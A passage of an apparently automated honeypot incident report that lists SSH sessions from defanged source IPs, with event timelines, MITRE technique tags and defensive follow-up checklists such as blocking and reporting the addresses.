| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:02:07` | `cowrie.session.connect` |
| `2026-11-13 04:02:08` | `cowrie.client.version` |
| `2026-11-13 04:02:08` | `cowrie.client.kex` |
| `2026-11-13 04:02:11` | `cowrie.login.success` |
| `2026-11-13 04:02:12` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-208e86a0703a

| Field | Detail |
|---|---|
| **Source IP** | `70.183.226[.]28` |
| **First Seen** | 2026-11-13 04:16 |
| **Last Seen** | 2026-11-13 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:16:16` | `cowrie.session.connect` |
| `2026-11-13 04:16:17` | `cowrie.client.version` |
| `2026-11-13 04:16:17` | `cowrie.client.kex` |
| `2026-11-13 04:16:19` | `cowrie.login.success` |
| `2026-11-13 04:16:19` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.183.226[.]28` to AbuseIPDB if not already reported
- [ ] Block `70.183.226[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28065659a7bf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-11-13 04:20 |
| **Last Seen** | 2026-11-13 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:20:08` | `cowrie.session.connect` |
| `2026-11-13 04:20:08` | `cowrie.client.version` |
| `2026-11-13 04:20:08` | `cowrie.client.kex` |
| `2026-11-13 04:20:09` | `cowrie.login.success` |
| `2026-11-13 04:20:09` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:20:09` | `cowrie.direct-tcpip.ja4` |
| `2026-11-13 04:20:09` | `cowrie.direct-tcpip.data` |
| `2026-11-13 04:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d615c41cc09a

| Field | Detail |
|---|---|
| **Source IP** | `186.18.220[.]21` |
| **First Seen** | 2026-11-13 04:30 |
| **Last Seen** | 2026-11-13 04:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:30:38` | `cowrie.session.connect` |
| `2026-11-13 04:30:39` | `cowrie.client.version` |
| `2026-11-13 04:30:39` | `cowrie.client.kex` |
| `2026-11-13 04:30:42` | `cowrie.login.success` |
| `2026-11-13 04:30:42` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.18.220[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.18.220[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1e8690eb04

| Field | Detail |
|---|---|
| **Source IP** | `31.208.14[.]62` |
| **First Seen** | 2026-11-13 04:30 |
| **Last Seen** | 2026-11-13 04:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:30:48` | `cowrie.session.connect` |
| `2026-11-13 04:30:49` | `cowrie.client.version` |
| `2026-11-13 04:30:49` | `cowrie.client.kex` |
| `2026-11-13 04:30:50` | `cowrie.login.success` |
| `2026-11-13 04:30:51` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.208.14[.]62` to AbuseIPDB if not already reported
- [ ] Block `31.208.14[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acf05b53d688

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-11-13 04:34 |
| **Last Seen** | 2026-11-13 04:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:34:17` | `cowrie.session.connect` |
| `2026-11-13 04:34:18` | `cowrie.client.version` |
| `2026-11-13 04:34:18` | `cowrie.client.kex` |
| `2026-11-13 04:34:21` | `cowrie.login.success` |
| `2026-11-13 04:34:22` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40fcad0b9659

| Field | Detail |
|---|---|
| **Source IP** | `217.208.90[.]253` |
| **First Seen** | 2026-11-13 04:34 |
| **Last Seen** | 2026-11-13 04:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:34:27` | `cowrie.session.connect` |
| `2026-11-13 04:34:28` | `cowrie.client.version` |
| `2026-11-13 04:34:28` | `cowrie.client.kex` |
| `2026-11-13 04:34:29` | `cowrie.login.success` |
| `2026-11-13 04:34:29` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.208.90[.]253` to AbuseIPDB if not already reported
- [ ] Block `217.208.90[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67affc0ef694

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-13 04:39 |
| **Last Seen** | 2026-11-13 04:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:39:18` | `cowrie.session.connect` |
| `2026-11-13 04:39:18` | `cowrie.client.version` |
| `2026-11-13 04:39:18` | `cowrie.client.kex` |
| `2026-11-13 04:39:18` | `cowrie.login.success` |
| `2026-11-13 04:39:18` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:39:19` | `cowrie.direct-tcpip.ja4` |
| `2026-11-13 04:39:19` | `cowrie.direct-tcpip.data` |
| `2026-11-13 04:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (352) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-9e51cc76e5f8 | HIGH | `80.94.95[.]118` | 2026-11-13 04:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-243e315bafe0 | HIGH | `138.226.239[.]233` | 2026-11-13 04:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1f8cde2b53ae | HIGH | `98.174.37[.]184` | 2026-11-13 04:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c7e7d778e15b | HIGH | `180.70.154[.]248` | 2026-11-13 04:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d9c27a7114c6 | HIGH | `65.49.1[.]232` | 2026-11-13 04:45 | Y | 3 | 0 | `T1078` |
| IR-d5b4268c4a61 | HIGH | `58.48.170[.]235` | 2026-11-13 04:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-358077a85fe0 | HIGH | `58.48.170[.]235` | 2026-11-13 04:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e846caccbf6d | HIGH | `103.159.199[.]43` | 2026-11-13 04:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eb1f090a7e43 | HIGH | `103.159.199[.]43` | 2026-11-13 04:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-14b9a6dfd185 | HIGH | `176.53.159[.]196` | 2026-11-13 04:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-953ee6174f7b | HIGH | `117.72.47[.]157` | 2026-11-13 04:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-50146ab4b6a2 | HIGH | `195.178.110[.]78` | 2026-11-13 04:55 | Y | 0 | 0 | `T1078` |
| IR-59dc608799fd | HIGH | `117.72.47[.]157` | 2026-11-13 04:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ec5501277d71 | HIGH | `95.188.91[.]101` | 2026-11-13 05:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fb35bcf7c878 | HIGH | `95.188.91[.]101` | 2026-11-13 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c3d1e625dc75 | HIGH | `14.47.3[.]217` | 2026-11-13 05:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0a258e844c9d | HIGH | `119.204.122[.]94` | 2026-11-13 05:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ec2d98dba480 | HIGH | `191.7.159[.]201` | 2026-11-13 05:12 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7fc7f0a1ccbf | HIGH | `39.191.29[.]160` | 2026-11-13 05:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7e0b1723832d | HIGH | `39.191.29[.]160` | 2026-11-13 05:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d5c3455d029c | HIGH | `191.7.159[.]201` | 2026-11-13 05:21 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ecc21cd4aded | HIGH | `189.7.113[.]89` | 2026-11-13 05:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d4cf19c76fef | HIGH | `182.95.123[.]50` | 2026-11-13 05:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fbc678e312c7 | HIGH | `191.7.159[.]201` | 2026-11-13 05:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f02918eec546 | HIGH | `94.255.255[.]26` | 2026-11-13 05:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-10e5dffea36f | HIGH | `187.63.65[.]238` | 2026-11-13 05:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fc1928fad909 | HIGH | `102.211.7[.]162` | 2026-11-13 05:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc299d064fc0 | HIGH | `187.8.64[.]94` | 2026-11-13 05:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c1601efd41ec | HIGH | `191.7.159[.]201` | 2026-11-13 05:32 | Y | 1 | 0 | `T1078 · T1592` |
| IR-916f53a96bb4 | HIGH | `35.210.93[.]97` | 2026-11-13 05:38 | Y | 3 | 0 | `T1078` |
| IR-c9dc7d618328 | HIGH | `35.210.93[.]97` | 2026-11-13 05:38 | Y | 1 | 0 | `T1078` |
| IR-3f735435151a | HIGH | `35.210.93[.]97` | 2026-11-13 05:38 | Y | 0 | 0 | `T1078` |
| IR-4532ef174337 | HIGH | `191.7.159[.]201` | 2026-11-13 05:40 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-acc857eb72f5 | HIGH | `142.86.121[.]147` | 2026-11-13 05:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ca4078027640 | HIGH | `142.86.121[.]147` | 2026-11-13 05:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-051d5d816c34 | HIGH | `191.7.159[.]201` | 2026-11-13 05:50 | Y | 1 | 0 | `T1078 · T1592` |
| IR-21a08c817a13 | HIGH | `191.7.159[.]201` | 2026-11-13 06:01 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-1f124855083a | HIGH | `176.53.159[.]196` | 2026-11-13 06:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c4585f45175c | HIGH | `191.7.159[.]201` | 2026-11-13 06:12 | Y | 1 | 0 | `T1057 · T1078 · T1083` |
| IR-e6ba606f4c71 | HIGH | `112.30.127[.]9` | 2026-11-13 06:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6ee0f13d484c | HIGH | `35.210.212[.]188` | 2026-11-13 06:21 | Y | 3 | 0 | `T1078` |
| IR-01931fa3d452 | HIGH | `35.210.212[.]188` | 2026-11-13 06:21 | Y | 1 | 0 | `T1078` |
| IR-8b0df49d163f | HIGH | `35.210.212[.]188` | 2026-11-13 06:21 | Y | 0 | 0 | `T1078` |
| IR-42216bfe59c7 | HIGH | `191.7.159[.]201` | 2026-11-13 06:23 | Y | 1 | 0 | `T1057 · T1078 · T1083` |
| IR-f831f89deaa5 | HIGH | `36.67.80[.]244` | 2026-11-13 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c6c636c476ab | HIGH | `72.215.44[.]85` | 2026-11-13 06:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ba1b67488bd6 | HIGH | `191.7.159[.]201` | 2026-11-13 06:35 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-372de35ec746 | HIGH | `117.2.123[.]19` | 2026-11-13 06:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-57159c798972 | HIGH | `187.115.144[.]103` | 2026-11-13 06:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-715b256d0643 | HIGH | `93.190.110[.]226` | 2026-11-13 06:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-461f3537f6e0 | HIGH | `187.50.226[.]182` | 2026-11-13 06:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-32ece7206d8a | HIGH | `195.178.110[.]78` | 2026-11-13 06:41 | Y | 0 | 0 | `T1078` |
| IR-03ffa95b7c81 | HIGH | `77.90.185[.]29` | 2026-11-13 06:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1d6b8d1a0622 | HIGH | `80.94.95[.]118` | 2026-11-13 06:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9c0d979f868f | HIGH | `138.226.239[.]234` | 2026-11-13 06:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b6a455229d47 | HIGH | `101.13.5[.]28` | 2026-11-13 06:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-784d398831e6 | HIGH | `41.24.76[.]51` | 2026-11-13 06:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7578e31be4a0 | HIGH | `191.7.159[.]201` | 2026-11-13 06:48 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e6544057e076 | HIGH | `201.28.234[.]10` | 2026-11-13 06:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fb61a7c1e0b4 | HIGH | `78.128.112[.]74` | 2026-11-13 06:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-75c1a57cad46 | HIGH | `120.50.206[.]196` | 2026-11-13 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-460e00ab7dc1 | HIGH | `201.28.171[.]203` | 2026-11-13 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a32f66c80f28 | HIGH | `106.75.77[.]231` | 2026-11-13 07:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3755879f7dbc | HIGH | `106.75.77[.]231` | 2026-11-13 07:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cd4c13b168c5 | HIGH | `45.251.69[.]11` | 2026-11-13 07:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b7c4ceaf8c3b | HIGH | `43.103.53[.]89` | 2026-11-13 07:08 | Y | 1 | 0 | `T1078 · T1592` |
| IR-030b99f55bee | HIGH | `50.6.200[.]71` | 2026-11-13 07:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-db3d2ac1d07b | HIGH | `50.6.200[.]71` | 2026-11-13 07:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55922ab2ed6a | HIGH | `62.220.104[.]155` | 2026-11-13 07:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eca7f91a04be | HIGH | `193.32.162[.]15` | 2026-11-13 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05417140b9a1 | HIGH | `213.230.127[.]104` | 2026-11-13 07:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-87602b71da4d | HIGH | `213.230.127[.]104` | 2026-11-13 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5b777184b096 | HIGH | `35.210.193[.]11` | 2026-11-13 07:17 | Y | 3 | 0 | `T1078` |
| IR-6dc5080d3f09 | HIGH | `35.210.193[.]11` | 2026-11-13 07:17 | Y | 1 | 0 | `T1078` |
| IR-dc1ae60b7111 | HIGH | `35.210.193[.]11` | 2026-11-13 07:17 | Y | 0 | 0 | `T1078` |
| IR-c039df1dcad3 | HIGH | `222.107.156[.]227` | 2026-11-13 07:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e6594e0bda7d | HIGH | `222.107.156[.]227` | 2026-11-13 07:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a5200b07ff4 | HIGH | `61.244.37[.]196` | 2026-11-13 07:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f30f9d80b095 | HIGH | `97.74.87[.]152` | 2026-11-13 07:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f1f4832a9688 | HIGH | `97.74.87[.]152` | 2026-11-13 07:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-19990130c058 | HIGH | `167.71.211[.]40` | 2026-11-13 07:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-05d16299591b | HIGH | `167.71.211[.]40` | 2026-11-13 07:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4488e5c4ffb8 | HIGH | `35.210.116[.]204` | 2026-11-13 07:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9f5ac388f098 | HIGH | `91.215.108[.]149` | 2026-11-13 07:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b3ce6c448c01 | HIGH | `202.53.94[.]242` | 2026-11-13 07:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-41ae9ed9ad27 | HIGH | `154.92.17[.]128` | 2026-11-13 07:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6eb7b6eb968e | HIGH | `154.92.17[.]128` | 2026-11-13 07:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-03e1980b1cb3 | HIGH | `83.254.172[.]36` | 2026-11-13 07:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bd2812fdc504 | HIGH | `49.124.152[.]148` | 2026-11-13 07:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89c4abd226bf | HIGH | `98.168.100[.]93` | 2026-11-13 07:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6b330cb3d949 | HIGH | `136.56.34[.]147` | 2026-11-13 07:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9cc0f399aeae | HIGH | `14.103.111[.]16` | 2026-11-13 07:55 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-ad8b0b570be4 | HIGH | `134.209.233[.]141` | 2026-11-13 08:00 | Y | 2 | 0 | `T1078` |
| IR-f49886cf752c | HIGH | `172.232.174[.]102` | 2026-11-13 08:03 | Y | 0 | 0 | `T1078` |
| IR-ddf95e6f952b | HIGH | `191.7.159[.]201` | 2026-11-13 08:03 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-7136cda6c658 | HIGH | `172.232.174[.]102` | 2026-11-13 08:05 | Y | 8 | 0 | `T1078` |
| IR-513a58938725 | HIGH | `41.93.32[.]39` | 2026-11-13 08:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f616c2fe4482 | HIGH | `41.93.32[.]39` | 2026-11-13 08:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aeb781142553 | HIGH | `119.204.122[.]94` | 2026-11-13 08:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5d8bc46c5372 | HIGH | `197.219.228[.]246` | 2026-11-13 08:19 | Y | 0 | 0 | `T1078 · T1592` |
_… 252 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **3** | 2026-11-13 08:55 | 2026-11-13 12:21 | 3m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | **3** | 2026-11-13 03:44 | 2026-11-13 06:41 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | **3** | 2026-11-13 08:53 | 2026-11-13 12:08 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `109.160.32[.]133` | **2** | 2026-11-13 13:17 | 2026-11-13 14:05 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-13 04:50 | 2026-11-13 06:33 | 1m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-11-13 13:24 | 2026-11-13 14:19 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `51.158.205[.]203` | **2** | 2026-11-13 03:59 | 2026-11-13 04:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-11-13 14:26 | 2026-11-13 14:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.2.88[.]64` | 1 | 2026-11-13 12:41 | 2026-11-13 12:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.26.101[.]76` | 1 | 2026-11-13 04:03 | 2026-11-13 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.254.77[.]18` | 1 | 2026-11-13 15:20 | 2026-11-13 15:20 | 26s | 0 | `T1592` | 🟢 LOW |
| `118.193.33[.]244` | 1 | 2026-11-13 04:31 | 2026-11-13 04:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `120.26.86[.]156` | 1 | 2026-11-13 11:23 | 2026-11-13 11:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.66.124[.]148` | 1 | 2026-11-13 05:34 | 2026-11-13 05:35 | 41s | 0 | `T1592` | 🟢 LOW |
| `122.139.196[.]138` | 1 | 2026-11-13 15:58 | 2026-11-13 16:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.108.129[.]94` | 1 | 2026-11-13 15:46 | 2026-11-13 15:46 | 31s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-13 16:30 | 2026-11-13 16:31 | 40s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-13 12:17 | 2026-11-13 12:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-13 16:16 | 2026-11-13 16:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]16` | 1 | 2026-11-13 07:55 | 2026-11-13 07:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.200.211[.]202` | 1 | 2026-11-13 04:16 | 2026-11-13 04:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.196.65[.]138` | 1 | 2026-11-13 06:16 | 2026-11-13 06:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.96.128[.]234` | 1 | 2026-11-13 05:05 | 2026-11-13 05:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-11-13 09:49 | 2026-11-13 09:49 | 1s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-13 09:31 | 2026-11-13 09:32 | 61s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-13 13:11 | 2026-11-13 13:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-11-13 07:03 | 2026-11-13 07:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-11-13 15:33 | 2026-11-13 15:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `171.35.40[.]68` | 1 | 2026-11-13 05:03 | 2026-11-13 05:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]4` | 1 | 2026-11-13 03:51 | 2026-11-13 03:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.232.174[.]102` | 1 | 2026-11-13 08:06 | 2026-11-13 08:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.68.43[.]123` | 1 | 2026-11-13 04:57 | 2026-11-13 04:57 | 3s | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]10` | 1 | 2026-11-13 16:46 | 2026-11-13 16:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-13 09:01 | 2026-11-13 09:01 | 9s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-13 06:44 | 2026-11-13 06:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]19` | 1 | 2026-11-13 11:10 | 2026-11-13 11:10 | 9s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]108` | 1 | 2026-11-13 09:08 | 2026-11-13 09:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.89.15[.]145` | 1 | 2026-11-13 07:21 | 2026-11-13 07:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.162.33[.]190` | 1 | 2026-11-13 08:00 | 2026-11-13 08:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-11-13 14:55 | 2026-11-13 14:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.3.53[.]2` | 1 | 2026-11-13 12:09 | 2026-11-13 12:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-13 04:20 | 2026-11-13 04:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-13 07:15 | 2026-11-13 07:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-13 09:43 | 2026-11-13 09:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-11-13 13:08 | 2026-11-13 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]201` | 1 | 2026-11-13 05:06 | 2026-11-13 05:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-13 14:34 | 2026-11-13 14:34 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.23.177[.]69` | 1 | 2026-11-13 03:14 | 2026-11-13 03:14 | 1s | 0 | `T1592` | 🟢 LOW |
| `197.101.175[.]232` | 1 | 2026-11-13 06:55 | 2026-11-13 06:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.219.228[.]250` | 1 | 2026-11-13 12:18 | 2026-11-13 12:18 | 10s | 0 | `T1592` | 🟢 LOW |
